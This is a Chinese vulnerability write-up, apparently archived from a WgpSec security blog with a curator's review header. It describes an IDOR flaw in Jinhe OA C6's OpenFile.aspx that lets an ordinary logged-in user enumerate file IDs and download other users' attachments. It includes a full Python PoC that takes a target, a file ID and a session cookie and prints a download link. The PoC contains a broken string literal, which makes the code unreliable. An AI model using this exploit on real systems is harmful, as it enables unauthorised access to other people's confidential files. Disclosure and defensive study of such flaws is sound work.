---
source: "MrWQ/vulnerability-paper"
title: "金和C6 OpenFile id附件水平越权"
product: "金和C6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "C6无build"
prerequisites: "普通用户登录"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/9Jv_iZSxCi3T-tYb2FdgmA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8C%20OA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md"
id: "vw-191f68083921bbb81f2974cd"
entity_id: "ve-191f68083921bbb81f2974cd"
schema_version: "1"
---

# 金和C6 OpenFile id附件水平越权

## 条目说明

- 对象与具体问题：金和C6；OpenFile id附件水平越权
- 版本、配置及部署条件：C6无build
- 认证与权限前提：普通用户登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 无独立新漏洞
- type须正确但脚本缺参数；取末3字符与Cookie正则脆弱
- 保留作者/WgpSec版权来源和双账户验证叙述，删推广

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9Jv_iZSxCi3T-tYb2FdgmA)

**点击蓝字**

![](../../.resource/remote/e196a44ab5c0c266d1799efc1e3868a880e0d09347a592a09e40339238fdbd85.gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：800

阅读时长：5min

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

  

一、

**_漏洞描述_**

金和 OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件

二、

**_漏洞影响_**

金和 OA C6  

三、

**_漏洞复现_**

登录后点击信息交流，发起协同页面

![](../../.resource/remote/7cfe2e3a6402db15de21f8766c4ee37f682df18eefb28a83bf9a191e25f05df9.png)

上传附件并上传发送给目标

这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程

![](../../.resource/remote/78a5444739ec327f3031b4787f44ddfe65b1ab069b3b9644bb3a82560150c5fc.png)

成功收到上传的附件

![](../../.resource/remote/6c9e18bb8855b7dc35033d730c536c15b48bb83b39a7ca4d3b58beeaf2a537af.png)

点击查看时抓包，发现一个带有文件 ID 的请求包

![](../../.resource/remote/ef3bec157b0ad2482b6767d0faeed5c5497d8f9c5a502222d00cd4c82db21c79.png)

返回了几个参数

```
var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png';
var strFileType = 'png';
var strSid='3jvpvhs410m2wdbbficax5q5';
var strFileIDCode='us9w7xWE7do=';
var strId = '1229';
var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log';
var strImgReg = 'jpg,gif,jpeg,png,ico';
var MD = '';
```

其中我们注意到 strFilePath 为文件的存储地址，我们更改 id 参数为另一个值，且测试后发现 name 文件名参数无关紧要

![](../../.resource/remote/4cead31410e778fb4847de9b16c5025522caa0c08c2a0f8aa6b9c833e2f89315.png)

改 ID 后发送请求包发现获得另一个文件的信息

访问 Url，注意 **type 参数** 需要为正确的文件后缀才可以访问

```
http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf
```

![](../../.resource/remote/2a8671a830ae6a654efbf6fe8d96bd889b46df708e6289eefcf172868e03b147.png)

这里更换一个普通用户测试是否可行，尝试遍历 id

![](../../.resource/remote/8ac588e5e4e062d271fb0fcc638cf4bc26f4c85f79d6d63faaa08f3c96d68c9c.png)

![](../../.resource/remote/a14fad8c86f0fde2302781d90bb62a9a2e5c3e505e74c8ecabebd759a24fbfcf.png)

存在 **strFilePath 参数** 则是存在文件，为空则是文件已经不存在

同时抓包下载文件页面也可以看到可获取的参数

**FileID 与 FileIDCode**

![](../../.resource/remote/f44f7a0812dbe05b3b2f318b7f12afa44dd548c84df76303bd2a082609854c52.png)

于是只需要通过刚刚的 ID 遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限

四、

**_漏洞 POC_**

```
POC只检测是否存在漏洞，且漏洞存在于后台需要登录
运行后访问链接即可下载文件
```

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 金和OA C6                                                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, file_id, cookie):
    vuln_url = target_url + "/C6/control/OpenFile.aspx?id={}&.format(file_id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie":cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 Url: {}\033[0m".format(vuln_url))
        if "strFilePath =" in response.text and response.status_code == 200:
            strFilePath = re.findall(r"var strFilePath = '(.*?)';", response.text)[0]
            strFileType = strFilePath[-3:]
            strFileIDCode = re.findall(r"var strFileIDCode='(.*?)';", response.text)[0]
            strId = re.findall(r"var strId = '(.*?)';", response.text)[0]
            sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0]
            if strFilePath != "":
                print("\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\n[o] 文件路径：{}\n[o] 文件类型：{}\n[o] 文件ID code：{}\n[o] 文件编号：{}\033[0m".format(target_url, strFilePath, strFileType,strFileIDCode, strId ))
                print("\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}".format(target_url, strId, strFileIDCode, sid))
            else:
                print("\033[31m[x] 目标 {} 文件不存在     \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    file_id = str(input("\033[35mFile_id >>> \033[0m"))
    cookie = str(input("\033[35mCookie  >>> \033[0m"))
    POC_1(target_url, file_id, cookie)
```

![](../../.resource/remote/0e66edabfcd87c7ef478d58cdcbe7c6ad96288b58afd7e5e5bb10dacc36f4957.png)

  

**_作者_**

  

![图片](../../.resource/remote/40b4bb848be8a556d4672c1284770f77f3c63bcb7d7d5bab550fac31288d8b51.png)

推荐一下 PeiQi 的个人公众号~

公众号

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](../../.resource/remote/b9e1284285c5071573cdab2007195e695eb9d397834bf8ada6d0ffc6fb61d537.jpg)

![](../../.resource/remote/bd8c348cdec726a3436db5005b7a9fce34d12de57cac8d2d94ac31a1c423b221.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
